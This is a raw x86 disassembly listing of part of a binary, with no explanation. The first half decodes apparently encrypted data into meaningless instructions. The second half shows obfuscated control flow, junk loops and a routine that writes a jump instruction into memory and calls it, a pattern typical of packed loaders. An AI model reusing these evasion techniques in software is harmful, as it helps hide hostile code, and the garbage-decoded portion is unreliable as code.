  422fd3:	sbb    eax,0x981bc57d
  422fd8:	xchg   ebx,eax
  422fd9:	addr16 cwde 
  422fdb:	or     eax,0xc05ccc0e
  422fe0:	ins    DWORD PTR es:[edi],dx
  422fe1:	fdivr  QWORD PTR [esi]
  422fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fe4:	mov    al,0x88
  422fe6:	enter  0x1064,0xac
  422fea:	mov    edx,0x41561a2a
  422fef:	stc    
  422ff0:	rcl    BYTE PTR [ebp+ebp*2+0x3025c984],1
  422ff7:	adc    ecx,DWORD PTR [ebx-0x7e]
  422ffa:	lock aad 0xd3
  422ffd:	jne    0x42307d
  422fff:	cmp    al,ch
  423001:	(bad)  
  423002:	psadbw mm7,QWORD PTR [edx]
  423005:	xchg   BYTE PTR [ecx-0x426a93a7],bl
  42300b:	inc    ecx
  42300c:	jb     0x423014
  42300e:	pop    ss
  42300f:	je     0x42300f
  423011:	adc    bh,dl
  423013:	rcr    BYTE PTR [eax+0x77b1610f],cl
  423019:	mov    eax,DWORD PTR [eax]
  42301b:	(bad)  
  42301c:	sbb    BYTE PTR [ebx+0x1f],cl
  42301f:	pop    ss
  423020:	test   al,0x12
  423022:	mov    ebx,0x393b99eb
  423027:	ds out 0xe5,eax
  42302a:	and    al,0x78
  42302c:	sbb    esp,eax
  42302e:	outs   dx,DWORD PTR ds:[esi]
  42302f:	mov    ds:0x95a286d,eax
  423034:	jae    0x423027
  423036:	sbb    al,0x1
  423038:	inc    ecx
  423039:	shl    DWORD PTR [edi+0x1f034912],cl
  42303f:	or     al,0xd6
  423041:	dec    esp
  423042:	push   cs
  423043:	inc    ecx
  423044:	jecxz  0x423050
  423046:	jmp    edi
  423048:	ret    0x8a95
  42304b:	xchg   edx,eax
  42304c:	or     al,0x1e
  42304e:	icebp  
  42304f:	jne    0x423099
  423051:	and    eax,0x51263ca1
  423056:	sbb    esi,DWORD PTR [ebp+0x7e]
  423059:	xor    ebx,DWORD PTR [edx-0x7e2a4dcb]
  42305f:	push   ss
  423060:	mov    edx,0x4a833b14
  423065:	mov    al,ds:0x3f4c2bb3
  42306a:	pop    ebp
  42306b:	mov    cl,0xcb
  42306d:	xchg   DWORD PTR [edi],eax
  42306f:	sub    al,0x85
  423071:	call   0xb858:0xdfa6d833
  423078:	mov    eax,esp
  42307a:	xor    DWORD PTR [edi-0x32b7a2e9],eax
  423080:	push   edi
  423081:	jmp    0x6ba5d3c9
  423086:	mov    ebx,0xe1b97699
  42308b:	add    ah,0x87
  42308e:	dec    ebp
  42308f:	mov    ds:0xbedcd39e,al
  423094:	xchg   ebx,eax
  423095:	stos   BYTE PTR es:[edi],al
  423096:	or     al,0xa1
  423098:	imul   ebx,DWORD PTR [edi],0x2f
  42309b:	jecxz  0x423096
  42309d:	in     al,dx
  42309e:	retf   
  42309f:	mov    ah,BYTE PTR ds:0x7588957d
  4230a5:	pop    es
  4230a6:	inc    edi
  4230a7:	sbb    esi,DWORD PTR [ebp-0x59da1889]
  4230ad:	dec    edx
  4230ae:	fcom   QWORD PTR [ecx+edx*8+0x76]
  4230b2:	pop    edi
  4230b3:	stos   BYTE PTR es:[edi],al
  4230b4:	add    al,0xa6
  4230b6:	retf   
  4230b7:	in     al,dx
  4230b8:	push   ds
  4230b9:	(bad)  
  4230ba:	fld    QWORD PTR [ebx]
  4230bc:	adc    BYTE PTR [ebp+0x30],ch
  4230bf:	sbb    BYTE PTR [eax],dl
  4230c1:	arpl   WORD PTR [ebp-0x12],bx
  4230c4:	mov    ch,0xe1
  4230c6:	lock in eax,0xdc
  4230c9:	push   edx
  4230ca:	fimul  WORD PTR [esi]
  4230cc:	xor    eax,0x2e94f172
  4230d1:	(bad)  
  4230d2:	ins    BYTE PTR es:[edi],dx
  4230d3:	data16 sbb al,0x2a
  4230d6:	add    ebx,DWORD PTR [eax-0xb]
  4230d9:	clc    
  4230da:	aaa    
  4230db:	je     0x42313e
  4230dd:	cli    
  4230de:	mov    ds:0x4bbf4005,al
  4230e3:	cmp    al,0xcd
  4230e5:	jae    0x4230a1
  4230e7:	mov    dl,0x70
  4230e9:	mov    dh,0xfd
  4230eb:	mov    eax,ebx
  4230ed:	xchg   BYTE PTR [eax+edx*2],bl
  4230f0:	ret    0x6e62
  4230f3:	(bad)  
  4230f4:	push   esi
  4230f5:	les    esp,FWORD PTR [edx]
  4230f7:	popf   
  4230f8:	xor    al,BYTE PTR [ebx-0x20]
  4230fb:	mov    esp,0x5701756d
  423100:	lods   al,BYTE PTR ds:[esi]
  423101:	fucomi st,st(5)
  423103:	adc    bl,BYTE PTR [edx]
  423105:	loop   0x423089
  423107:	ja     0x42308a
  423109:	jno    0x4230ff
  42310b:	sub    BYTE PTR [ebx],ch
  42310d:	shl    esp,0xd8
  423110:	(bad)  
  423111:	cmp    ah,BYTE PTR [eax]
  423113:	test   edx,0x5d1c918e
  423119:	inc    eax
  42311a:	xchg   ecx,eax
  42311b:	xor    ebx,DWORD PTR [ebx+0x46f4c6da]
  423121:	sub    DWORD PTR [edi+0x4a58de93],esi
  423127:	cmp    esi,ecx
  423129:	jge    0x4230de
  42312b:	pop    eax
  42312c:	mov    al,0x8a
  42312e:	pop    edi
  42312f:	dec    edx
  423130:	push   0x47
  423132:	jecxz  0x423113
  423134:	outs   dx,DWORD PTR ds:[esi]
  423135:	jo     0x423127
  423137:	mov    ds:0xe573e1dc,al
  42313c:	jmp    0x6492:0x21a2fcf9
  423143:	pop    ebp
  423144:	(bad)  
  423145:	js     0x4230fa
  423147:	dec    ebp
  423148:	push   es
  423149:	imul   edi,DWORD PTR [esi+0x10],0x53
  42314d:	jbe    0x423159
  42314f:	xor    esi,edi
  423151:	loop   0x423110
  423153:	jg     0x423187
  423155:	jp     0x423180
  423157:	sub    DWORD PTR [esi-0x54],edx
  42315a:	mov    eax,0xb8fa9eb8
  42315f:	xor    DWORD PTR [eax+0x3b462224],ebx
  423165:	pop    eax
  423166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423167:	popa   
  423168:	imul   esi,esi,0xffffffcd
  42316b:	xchg   DWORD PTR [ecx+edx*4],eax
  42316e:	iret   
  42316f:	mov    ebp,0xa6eb2f26
  423174:	int    0x3d
  423176:	nop
  423177:	ja     0x4231cd
  423179:	std    
  42317a:	sub    DWORD PTR [eax+eax*2],0x721a4769
  423181:	push   esp
  423182:	stos   DWORD PTR es:[edi],eax
  423183:	iret   
  423184:	jae    0x423198
  423186:	mov    dh,0x9c
  423188:	jl     0x4231df
  42318a:	mov    ebp,0x4cd5b2ab
  42318f:	jb     0x4231ed
  423191:	add    DWORD PTR [esi-0x60],ebp
  423194:	dec    esi
  423195:	pop    ebp
  423196:	mov    ebp,ecx
  423198:	jns    0x423164
  42319a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42319b:	mov    bl,0x91
  42319d:	ja     0x42314c
  42319f:	cli    
  4231a0:	jne    0x4231eb
  4231a2:	jg     0x423145
  4231a4:	mov    DWORD PTR [ebp+0x5048431c],esp
  4231aa:	lahf   
  4231ab:	and    DWORD PTR [ecx],esi
  4231ad:	cmp    esi,DWORD PTR [edi-0x65]
  4231b0:	aad    0xac
  4231b2:	dec    ecx
  4231b3:	xchg   edi,eax
  4231b4:	adc    eax,0x1bdda5e1
  4231b9:	xchg   esp,eax
  4231ba:	adc    dh,BYTE PTR [ecx+0x6]
  4231bd:	in     al,dx
  4231be:	call   0x8ec7e0a9
  4231c3:	dec    esi
  4231c4:	iret   
  4231c5:	mov    ecx,0xa7da84af
  4231ca:	jmp    0x7837cb16
  4231cf:	xchg   ebx,eax
  4231d0:	aas    
  4231d1:	or     eax,0xb4190ab3
  4231d6:	std    
  4231d7:	xor    al,0xd0
  4231d9:	sahf   
  4231da:	stos   DWORD PTR es:[edi],eax
  4231db:	retf   0x56e0
  4231de:	dec    edx
  4231df:	xlat   BYTE PTR ds:[ebx]
  4231e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231e1:	pop    ecx
  4231e2:	rcr    DWORD PTR [eax+0x25],cl
  4231e5:	ds (bad) 
  4231e7:	inc    eax
  4231e8:	xchg   esp,eax
  4231e9:	lods   eax,DWORD PTR ds:[esi]
  4231ea:	and    BYTE PTR [edi+0x69],0xaa
  4231ee:	test   al,0x2f
  4231f0:	push   0xffffffd5
  4231f2:	pop    eax
  4231f3:	pop    ds
  4231f4:	inc    edi
  4231f5:	dec    edi
  4231f6:	add    ah,BYTE PTR [eax-0x6c]
  4231f9:	in     eax,0x9
  4231fb:	sub    al,0x8a
  4231fd:	js     0x42320c
  4231ff:	retf   
  423200:	(bad)  
  423201:	push   ecx
  423202:	mov    cl,0xc4
  423204:	mov    eax,ds:0x5f96a344
  423209:	mov    BYTE PTR [ebp+0x76],ch
  42320c:	pop    esi
  42320d:	clc    
  42320e:	xchg   ebp,eax
  42320f:	(bad)  
  423210:	out    0xaf,al
  423212:	dec    ebp
  423213:	dec    ebp
  423214:	inc    edi
  423215:	dec    ebx
  423216:	sub    al,0xd2
  423218:	xchg   esi,eax
  423219:	pop    esp
  42321a:	fcomp  st(3)
  42321c:	mov    dl,BYTE PTR [ebp+0x16]
  42321f:	rcr    DWORD PTR [esi+0x1e],1
  423222:	mov    ds:0x318c12ee,al
  423227:	pop    ss
  423228:	ret    0x6664
  42322b:	lock jnp 0x4231f8
  42322e:	in     eax,0x9b
  423230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423231:	out    dx,eax
  423232:	ss cwde 
  423234:	and    dl,BYTE PTR [ebx+0x61f67ebd]
  42323a:	adc    ebx,DWORD PTR [eax-0xf899ddf]
  423240:	jae    0x42329a
  423242:	scas   eax,DWORD PTR es:[edi]
  423243:	mov    ch,0x8d
  423245:	and    eax,0x7cd3a4ef
  42324a:	paddusw mm5,QWORD PTR [ebp-0x37]
  42324e:	outs   dx,DWORD PTR ds:[esi]
  42324f:	sti    
  423250:	xor    BYTE PTR [ebp+0x4d],dl
  423253:	aaa    
  423254:	cmc    
  423255:	mov    dh,0x12
  423257:	sub    BYTE PTR [edi+0x8],cl
  42325a:	and    al,0x6d
  42325c:	pusha  
  42325d:	jb     0x4232ae
  42325f:	xchg   esp,eax
  423260:	and    ebp,esp
  423262:	xor    al,dl
  423264:	mov    ch,0x9d
  423266:	jmp    0x287c86a4
  42326b:	adc    WORD PTR es:[esi+esi*4+0x42],dx
  423271:	and    edx,ecx
  423273:	jb     0x42321c
  423275:	das    
  423276:	fiadd  WORD PTR [esp+edx*4+0x398b79c9]
  42327d:	stc    
  42327e:	push   ecx
  42327f:	pop    ebx
  423280:	xchg   edx,eax
  423281:	push   0xffffffcf
  423283:	mov    esi,0xba5261ab
  423288:	push   ecx
  423289:	cmp    dl,BYTE PTR [edx+0x6f]
  42328c:	dec    eax
  42328d:	mov    ah,0xad
  42328f:	push   es
  423290:	out    dx,al
  423291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423292:	pop    esi
  423293:	xchg   esp,eax
  423294:	mov    edi,0x47d09b5f
  423299:	std    
  42329a:	out    0xb9,eax
  42329c:	and    al,0x34
  42329e:	ins    DWORD PTR es:[edi],dx
  42329f:	icebp  
  4232a0:	clc    
  4232a1:	xor    ecx,DWORD PTR [esi+0xd]
  4232a4:	jns    0x4232c7
  4232a6:	mov    ebp,DWORD PTR [edi+esi*1]
  4232a9:	dec    esp
  4232aa:	int    0x5d
  4232ac:	jmp    0x4232dd
  4232ae:	lock shr BYTE PTR [ecx+0x50a439a2],0xb6
  4232b6:	int3   
  4232b7:	push   ecx
  4232b8:	push   ebx
  4232b9:	fst    QWORD PTR [esi-0x42b0fd]
  4232bf:	xchg   esp,eax
  4232c0:	pop    esi
  4232c1:	(bad)  
  4232c2:	repnz mov eax,0xeb96b898
  4232c8:	pop    ecx
  4232c9:	pop    edi
  4232ca:	push   ss
  4232cb:	or     DWORD PTR [ebx],esp
  4232cd:	dec    esp
  4232ce:	cmc    
  4232cf:	cmp    cl,bh
  4232d1:	fwait
  4232d2:	jbe    0x42330f
  4232d4:	jns    0x423348
  4232d6:	jmp    0x7ff5864a
  4232db:	and    al,0xeb
  4232dd:	mov    bl,0xb8
  4232df:	lods   eax,DWORD PTR ds:[esi]
  4232e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232e1:	fmul   QWORD PTR [ecx]
  4232e3:	pop    edi
  4232e4:	push   0x1f024c68
  4232e9:	mov    eax,ds:0x82270f28
  4232ee:	mov    bh,0xdb
  4232f0:	das    
  4232f1:	push   0xf9ff6bc0
  4232f6:	ja     0x42333c
  4232f8:	pop    ebp
  4232f9:	pop    DWORD PTR [edi-0x77361171]
  4232ff:	jp     0x42334e
  423301:	jns    0x423381
  423303:	push   ebx
  423304:	xor    ebx,DWORD PTR [esi-0x21]
  423307:	push   esp
  423308:	push   edi
  423309:	in     al,0xfc
  42330b:	sar    cl,1
  42330d:	dec    ebp
  42330e:	loope  0x4232bc
  423310:	dec    edx
  423311:	ins    DWORD PTR es:[edi],dx
  423312:	mov    ds:0xa57e1e75,al
  423317:	add    al,0x4a
  423319:	in     eax,dx
  42331a:	test   eax,0x4babea26
  42331f:	fsubr  QWORD PTR [ebx-0x767e4e68]
  423325:	pop    eax
  423326:	jle    0x4233a0
  423328:	ss scas eax,DWORD PTR es:[edi]
  42332a:	ja     0x4232e0
  42332c:	pop    eax
  42332d:	sbb    ch,dl
  42332f:	fs es xchg ebx,eax
  423332:	imul   ebp,DWORD PTR [ebx],0x7f
  423335:	iret   
  423336:	jne    0x4232ec
  423338:	jle    0x4232bc
  42333a:	jnp    0x4233a5
  42333c:	mov    DWORD PTR [ebp-0x20],eax
  42333f:	mov    eax,DWORD PTR [ebp-0x4]
  423342:	mov    ecx,DWORD PTR [ebp-0x4]
  423345:	sub    eax,ecx
  423347:	mov    DWORD PTR [ebp-0x4],eax
  42334a:	or     DWORD PTR [ebp-0x4],0xf89c85be
  423351:	mov    eax,DWORD PTR [ebp-0xc]
  423354:	xor    eax,esi
  423356:	add    eax,edi
  423358:	push   eax
  423359:	mov    eax,DWORD PTR [ebp-0x10]
  42335c:	xor    eax,esi
  42335e:	add    eax,edi
  423360:	push   eax
  423361:	mov    eax,DWORD PTR [ebp-0x4]
  423364:	xor    eax,esi
  423366:	add    eax,edi
  423368:	push   eax
  423369:	lea    eax,[ebp-0x78]
  42336c:	push   eax
  42336d:	push   DWORD PTR [ebp-0x2c]
  423370:	push   DWORD PTR [ebp-0x28]
  423373:	call   0x413e4f
  423378:	test   eax,eax
  42337a:	je     0x4233a8
  423380:	lea    eax,[ebp-0x78]
  423383:	push   eax
  423384:	mov    eax,DWORD PTR [ebp-0x28]
  423387:	xor    eax,esi
  423389:	add    eax,edi
  42338b:	push   eax
  42338c:	mov    eax,DWORD PTR [ebp-0x24]
  42338f:	add    eax,0xaa
  423394:	push   eax
  423395:	mov    eax,DWORD PTR [ebp-0x24]
  423398:	mov    eax,DWORD PTR [eax+0x198]
  42339e:	push   DWORD PTR [eax]
  4233a0:	call   0x40a988
  4233a5:	mov    DWORD PTR [ebp-0x14],eax
  4233a8:	mov    ecx,DWORD PTR ds:0x429516
  4233ae:	lea    eax,[ebp+0x4]
  4233b1:	mov    DWORD PTR [ecx*4+0x42950e],eax
  4233b8:	inc    DWORD PTR ds:0x429516
  4233be:	mov    eax,DWORD PTR [ebp-0x14]
  4233c1:	test   eax,eax
  4233c3:	je     0x42342b
  4233c9:	lea    eax,[ebp-0x8]
  4233cc:	mov    DWORD PTR [ebp-0x34],eax
  4233cf:	mov    eax,DWORD PTR [ebp-0x30]
  4233d2:	mov    DWORD PTR [ebp-0x8],eax
  4233d5:	mov    eax,DWORD PTR [ebp-0x8]
  4233d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4233db:	sub    eax,ecx
  4233dd:	mov    DWORD PTR [ebp-0x8],eax
  4233e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4233e3:	xor    ecx,esi
  4233e5:	mov    eax,0xffcd8d0f
  4233ea:	sub    eax,ecx
  4233ec:	add    DWORD PTR [ebp-0x8],eax
  4233ef:	mov    eax,DWORD PTR [ebp-0x8]
  4233f2:	mov    ecx,DWORD PTR [ebp-0x14]
  4233f5:	mov    DWORD PTR [ecx+0x1],eax
  4233f8:	mov    eax,DWORD PTR [ebp-0x14]
  4233fb:	push   DWORD PTR [ebp-0x24]
  4233fe:	mov    BYTE PTR [eax],0xe9
  423401:	mov    eax,ds:0x42929a
  423406:	push   DWORD PTR [eax]
  423408:	push   DWORD PTR ds:0x4294fe
  42340e:	push   DWORD PTR ds:0x4292a2
  423414:	push   DWORD PTR ds:0x4294de
  42341a:	push   DWORD PTR ds:0x42a04a
  423420:	push   DWORD PTR [ebp-0x28]
  423423:	push   DWORD PTR [ebp-0x2c]
  423426:	mov    eax,DWORD PTR [ebp-0x14]
  423429:	call   eax
  42342b:	pop    edi
  42342c:	pop    esi
  42342d:	leave  
  42342e:	ret    
  42342f:	push   ebp
  423430:	mov    ebp,esp
  423432:	sub    esp,0x1c
  423435:	and    DWORD PTR ds:0x42a2ae,0x0
  42343f:	mov    ecx,DWORD PTR ds:0x42a2ae
  423445:	inc    ecx
  423446:	mov    DWORD PTR ds:0x42a2ae,ecx
  42344c:	cmp    DWORD PTR ds:0x42a2ae,0x27
  423453:	jle    0x42347b
  423459:	jmp    0x42346e
  42345e:	push   0x42a262
  423463:	push   0x429153
  423468:	call   DWORD PTR ds:0x42a3f2
  42346e:	cmp    DWORD PTR ds:0x42a2ae,0x1c
  423475:	jb     0x42343f
  42347b:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  423482:	lea    eax,[ebp+0x14]
  423485:	add    DWORD PTR ds:0x42a272,ebx
  42348b:	mov    DWORD PTR [ebp-0x4],eax
  42348e:	and    DWORD PTR ds:0x42a2de,0x0
  423498:	jmp    0x4234ac
  42349d:	xor    ecx,ecx
  42349f:	or     ecx,DWORD PTR ds:0x42a2de
  4234a5:	inc    ecx
  4234a6:	mov    DWORD PTR ds:0x42a2de,ecx
  4234ac:	cmp    DWORD PTR ds:0x42a2de,0x13
  4234b3:	jae    0x4234f8
  4234b9:	cmp    DWORD PTR ds:0x42a2de,0x7
  4234c0:	ja     0x4234f8
  4234c6:	jmp    0x4234d7
  4234cb:	push   DWORD PTR [ebp-0x10]
  4234ce:	push   DWORD PTR [ebp-0xc]
  4234d1:	call   DWORD PTR ds:0x42a3c2
  4234d7:	cmp    DWORD PTR ds:0x42a2de,0x6
  4234de:	jne    0x4234f3
  4234e4:	xor    ecx,ecx
  4234e6:	or     ecx,DWORD PTR ds:0x42a2de
  4234ec:	inc    ecx
  4234ed:	mov    DWORD PTR ds:0x42a2de,ecx
  4234f3:	jmp    0x42349d
  4234f8:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4234ff:	and    DWORD PTR ds:0x42a2ba,0x0
  423509:	xor    edx,edx
  42350b:	xor    edx,DWORD PTR ds:0x42a2ba
  423511:	inc    edx
  423512:	mov    DWORD PTR ds:0x42a2ba,edx
  423518:	cmp    DWORD PTR ds:0x42a2ba,0x25
  42351f:	jb     0x42354b
  423525:	jmp    0x42353e
  42352a:	push   DWORD PTR [ebp-0x10]
  42352d:	push   0x42a2ae
  423532:	push   DWORD PTR [ebp-0x10]
  423535:	push   DWORD PTR [ebp-0x20]
  423538:	call   DWORD PTR ds:0x42a3f6
  42353e:	cmp    DWORD PTR ds:0x42a2ba,0x1e
  423545:	jb     0x423509
  42354b:	lea    eax,[ebp-0xc]
  42354e:	xor    ecx,ecx
  423550:	mov    DWORD PTR [ebp-0x14],eax
  423553:	or     eax,DWORD PTR ds:0x42a25e
  423559:	mov    eax,DWORD PTR [ebp-0xc]
  42355c:	and    DWORD PTR ds:0x42a2da,ebx
  423562:	mov    edx,DWORD PTR [ebp-0x14]
  423565:	mov    DWORD PTR ds:0x42a2a6,0x55c4
  42356f:	mov    ecx,0x75108aa
  423574:	xor    eax,ecx
  423576:	sub    DWORD PTR ds:0x42a26a,0x3296
  423580:	add    eax,0x3272f1
  423585:	mov    DWORD PTR [edx],eax
  423587:	add    edx,eax
  423589:	mov    eax,ds:0x429296
  42358e:	mov    DWORD PTR ds:0x42a2da,0x12
  423598:	cmp    DWORD PTR ds:0x42a2da,0x0
  42359f:	je     0x4235f3
  4235a5:	cmp    DWORD PTR ds:0x42a2da,0x5
  4235ac:	jb     0x4235f3
  4235b2:	jmp    0x4235c7
  4235b7:	push   0x471b
  4235bc:	push   0x42a2a6
  4235c1:	call   DWORD PTR ds:0x42a3fa
  4235c7:	cmp    DWORD PTR ds:0x42a2da,0x6
  4235ce:	jne    0x4235e1
  4235d4:	mov    edx,DWORD PTR ds:0x42a2da
  4235da:	dec    edx
  4235db:	mov    DWORD PTR ds:0x42a2da,edx
  4235e1:	mov    edx,DWORD PTR ds:0x42a2da
  4235e7:	dec    edx
  4235e8:	mov    DWORD PTR ds:0x42a2da,edx
  4235ee:	jmp    0x423598
  4235f3:	mov    edx,DWORD PTR [ebp-0x4]
  4235f6:	mov    eax,DWORD PTR [eax]
  4235f8:	add    eax,DWORD PTR [edx]
  4235fa:	sub    DWORD PTR ds:0x42a2da,ebx
  423600:	push   esi
  423601:	sub    edx,edx
  423603:	mov    DWORD PTR [ebp-0x8],eax
  423606:	mov    edx,DWORD PTR [ebp+0x8]
  423609:	mov    eax,ds:0x42941e
  42360e:	mov    eax,DWORD PTR [eax+0x198]
  423614:	xor    edx,ecx
  423616:	or     DWORD PTR ds:0x42a2ca,ebx
  42361c:	mov    esi,0x3272f1
  423621:	adc    DWORD PTR ds:0x42a262,0x42a296
  42362b:	add    edx,esi
  42362d:	mov    DWORD PTR ds:0x42a2ae,0x33f
  423637:	cmp    DWORD PTR [eax],edx
  423639:	mov    DWORD PTR ds:0x42a29e,0x6ec0
  423643:	je     0x423664
  423649:	mov    DWORD PTR ds:0x42a2d2,0x6d4b
  423653:	mov    eax,DWORD PTR [eax]
  423655:	mov    DWORD PTR ds:0x42a296,0x79fc
  42365f:	jmp    0x423a89
  423664:	mov    eax,DWORD PTR [ebp+0x18]
  423667:	xor    eax,ecx
  423669:	and    DWORD PTR ds:0x42a27a,0x42a26a
  423673:	push   ebx
  423674:	and    DWORD PTR ds:0x42a2c2,0x0
  42367e:	jmp    0x423692
  423683:	xor    ebx,ebx
  423685:	xor    ebx,DWORD PTR ds:0x42a2c2
  42368b:	inc    ebx
  42368c:	mov    DWORD PTR ds:0x42a2c2,ebx
  423692:	cmp    DWORD PTR ds:0x42a2c2,0x1b
  423699:	jae    0x4236bf
  42369f:	cmp    DWORD PTR ds:0x42a2c2,0x26
  4236a6:	jb     0x4236bf
  4236ac:	jmp    0x4236ba
  4236b1:	push   DWORD PTR [ebp-0x20]
  4236b4:	call   DWORD PTR ds:0x42a3c6
  4236ba:	jmp    0x423683
  4236bf:	add    eax,esi
  4236c1:	sub    ebx,DWORD PTR ds:0x42a266
  4236c7:	xor    edx,edx
  4236c9:	mov    ebx,0xfabdbed8
  4236ce:	and    DWORD PTR ds:0x42a302,0x5581
  4236d8:	add    eax,ebx
  4236da:	push   edi
  4236db:	mov    DWORD PTR ds:0x42a2de,0x181
  4236e5:	adc    edx,0xffffffff
  4236e8:	movzx  edi,BYTE PTR ds:0x42a2fa
  4236ef:	adc    DWORD PTR ds:0x42a2d2,edi
  4236f5:	mov    edi,0x8a29a13d
  4236fa:	xor    eax,edi
  4236fc:	xor    edx,0x0
  4236ff:	cmp    eax,0x70941fe5
  423704:	jne    0x423727
  42370a:	cmp    edx,0xffffffff
  42370d:	mov    DWORD PTR ds:0x42a2d6,0x6011
  423717:	jne    0x423727
  42371d:	push   0xf89c85ba
  423722:	jmp    0x423a76
  423727:	mov    eax,DWORD PTR [ebp+0x18]
  42372a:	xor    eax,ecx
  42372c:	adc    DWORD PTR ds:0x42a29a,0x42a2d6
  423736:	add    eax,esi
  423738:	mov    DWORD PTR ds:0x42a2f2,0x535
  423742:	xor    edx,edx
  423744:	xor    DWORD PTR ds:0x42a2de,0x42a286
  42374e:	add    eax,ebx
  423750:	adc    edx,0xffffffff
  423753:	xor    eax,edi
  423755:	xor    edx,0x0
  423758:	mov    DWORD PTR ds:0x42a26a,0x15dc
  423762:	cmp    eax,0x70941fe7
  423767:	mov    DWORD PTR ds:0x42a2da,0x1950
  423771:	jne    0x423a63
  423777:	mov    DWORD PTR ds:0x42a2a2,0x37f9
  423781:	cmp    edx,0xffffffff
  423784:	jne    0x423a63
  42378a:	add    edx,DWORD PTR ds:0x42a286
  423790:	mov    eax,DWORD PTR [ebp+0x10]
  423793:	movzx  edx,WORD PTR ds:0x42a2da
  42379a:	xor    DWORD PTR ds:0x42a2f6,edx
  4237a0:	xor    eax,ecx
  4237a2:	add    DWORD PTR ds:0x42a292,0x42a302
  4237ac:	add    eax,esi
  4237ae:	mov    DWORD PTR [ebp-0x18],eax
  4237b1:	mov    eax,DWORD PTR [ebp+0xc]
  4237b4:	mov    edx,DWORD PTR [ebp-0x8]
  4237b7:	xor    eax,ecx
  4237b9:	add    eax,esi
  4237bb:	xor    DWORD PTR ds:0x42a2be,0x55ef
  4237c5:	imul   eax,DWORD PTR [edx]
  4237c8:	mov    DWORD PTR ds:0x42a296,0x1045
  4237d2:	mov    edx,DWORD PTR [ebp+0x8]
  4237d5:	sub    DWORD PTR ds:0x42a2f6,0x3ea4
  4237df:	xor    edx,ecx
  4237e1:	adc    DWORD PTR ds:0x42a2e2,0x475c
  4237eb:	add    edx,esi
  4237ed:	mov    DWORD PTR ds:0x42a2be,0x342
  4237f7:	cmp    edx,eax
  4237f9:	mov    DWORD PTR ds:0x42a2b6,0x7ea6
  423803:	mov    eax,DWORD PTR [ebp-0x4]
  423806:	je     0x4238e0
  42380c:	mov    edx,DWORD PTR [ebp-0x18]
  42380f:	sub    DWORD PTR ds:0x42a2aa,0x2e10
  423819:	add    DWORD PTR [eax],edx
  42381b:	xor    DWORD PTR ds:0x42a2c6,ebx
  423821:	mov    eax,DWORD PTR [ebp-0x4]
  423824:	mov    edx,DWORD PTR ds:0x42a27e
  42382a:	and    DWORD PTR ds:0x42a2ee,edx
  423830:	mov    edx,DWORD PTR [ebp+0xc]
  423833:	or     DWORD PTR ds:0x42a2c6,0x42a2ea
  42383d:	xor    edx,ecx
  42383f:	xor    DWORD PTR ds:0x42a2a2,0x2c59
  423849:	add    edx,esi
  42384b:	add    DWORD PTR ds:0x42a25a,0x1203
  423855:	imul   edx,DWORD PTR [eax]
  423858:	mov    DWORD PTR [eax],edx
  42385a:	mov    eax,DWORD PTR [ebp-0x4]
  42385d:	mov    DWORD PTR [ebp-0x1c],eax
  423860:	and    DWORD PTR ds:0x42a2de,0x0
  42386a:	jmp    0x42387a
  42386f:	mov    eax,ds:0x42a2de
  423874:	inc    eax
  423875:	mov    ds:0x42a2de,eax
  42387a:	cmp    DWORD PTR ds:0x42a2de,0x1a
  423881:	jae    0x4238cc
  423887:	cmp    DWORD PTR ds:0x42a2de,0xc
  42388e:	jl     0x4238cc
  423894:	jmp    0x4238ac
  423899:	push   DWORD PTR [ebp-0x10]
  42389c:	push   0x1
  42389e:	push   DWORD PTR [ebp-0x24]
  4238a1:	push   0x429153
  4238a6:	call   DWORD PTR ds:0x42a3ca
  4238ac:	cmp    DWORD PTR ds:0x42a2de,0xb
  4238b3:	jne    0x4238c7
  4238b9:	xor    eax,eax
  4238bb:	xor    eax,DWORD PTR ds:0x42a2de
  4238c1:	inc    eax
  4238c2:	mov    ds:0x42a2de,eax
  4238c7:	jmp    0x42386f
  4238cc:	mov    eax,DWORD PTR [ebp+0x10]
  4238cf:	xor    eax,ecx
  4238d1:	mov    edx,0xffcd8d0f
  4238d6:	sub    edx,eax
  4238d8:	mov    eax,DWORD PTR [ebp-0x1c]
  4238db:	jmp    0x4238fa
  4238e0:	mov    edx,DWORD PTR [ebp+0x14]
  4238e3:	xor    DWORD PTR [eax],edx
  4238e5:	mov    eax,DWORD PTR [ebp-0x4]
  4238e8:	mov    DWORD PTR [ebp-0x1c],eax
  4238eb:	mov    eax,DWORD PTR [ebp+0x10]
  4238ee:	xor    eax,ecx
  4238f0:	mov    edx,0xffcd8d0f
  4238f5:	sub    edx,eax
  4238f7:	mov    eax,DWORD PTR [ebp-0x1c]
  4238fa:	add    DWORD PTR [eax],edx
  4238fc:	mov    eax,DWORD PTR [ebp-0x4]
  4238ff:	mov    edx,DWORD PTR [ebp-0x8]
  423902:	add    edx,DWORD PTR [eax]
  423904:	mov    DWORD PTR [ebp-0x8],edx
  423907:	mov    eax,DWORD PTR [ebp+0xc]
  42390a:	mov    edx,DWORD PTR [ebp+0xc]
  42390d:	xor    edx,ecx
  42390f:	xor    eax,ecx
  423911:	lea    eax,[eax+edx*1+0x64e5e2]
  423918:	mov    edx,DWORD PTR [ebp+0xc]
  42391b:	xor    edx,ecx
  42391d:	add    edx,esi
  42391f:	imul   eax,edx
  423922:	mov    edx,DWORD PTR [ebp+0xc]
  423925:	xor    edx,ecx
  423927:	sub    edx,eax
  423929:	mov    eax,DWORD PTR [ebp-0x4]
  42392c:	add    edx,esi
  42392e:	cmp    DWORD PTR [eax],edx
  423930:	mov    eax,DWORD PTR [ebp-0x4]
  423933:	jg     0x423950
  423939:	mov    DWORD PTR [ebp-0x1c],eax
  42393c:	mov    eax,DWORD PTR [ebp+0x10]
  42393f:	xor    eax,ecx
  423941:	mov    edx,0xffcd8d0f
  423946:	sub    edx,eax
  423948:	mov    eax,DWORD PTR [ebp-0x1c]
  42394b:	jmp    0x423957
  423950:	mov    edx,DWORD PTR [ebp+0x10]
  423953:	xor    edx,ecx
  423955:	add    edx,esi
